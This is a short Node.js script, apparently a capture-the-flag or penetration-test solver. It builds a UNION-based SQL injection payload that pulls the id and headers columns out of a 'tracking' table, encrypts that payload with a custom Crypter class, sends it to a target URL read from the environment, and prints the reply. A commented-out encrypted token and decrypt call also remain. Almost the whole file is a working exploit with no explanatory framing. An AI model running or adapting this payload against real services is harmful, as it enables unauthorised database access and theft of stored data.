import { config } from "dotenv";
import Crypter from "./lib/Crypter";
import fetch from 'node-fetch';

config();

const crypter = new Crypter(100);

// const srcText =
//   "M3yFwEnfgxmdtbM52n8U2DDQJY3nsYDrVwMCLu5sTvfpPtAmR3b5C-U!Z7-R5WlhXbmZLUs1dyLJYQOfdJKi6WxBHtMe7UxVjkM9GtXSVAki7m78TSnAsM8otlau0KMWLu-STIlIEqQvsECWZJ7f6FMGnylFhhcsY2cCtePwxNyG2HJh8jHpoOJJKEzoyyHRktgFvO9Ze2sKA-9UOTHLMQ~~";

async function main() {
  // const decipherText = await crypter.decrypt(srcText);
  // console.log(decipherText);

  const injection = `9 union select (SELECT concat_ws(':',\`id\`,\`headers\`) FROM tracking limit 1,1),1`;
  const encText = await crypter.encrypt(JSON.stringify({ id: injection }));
  const apiRespond = await ( await fetch(process.env.URL + encText) ).text();
  console.log(apiRespond);
}

main();
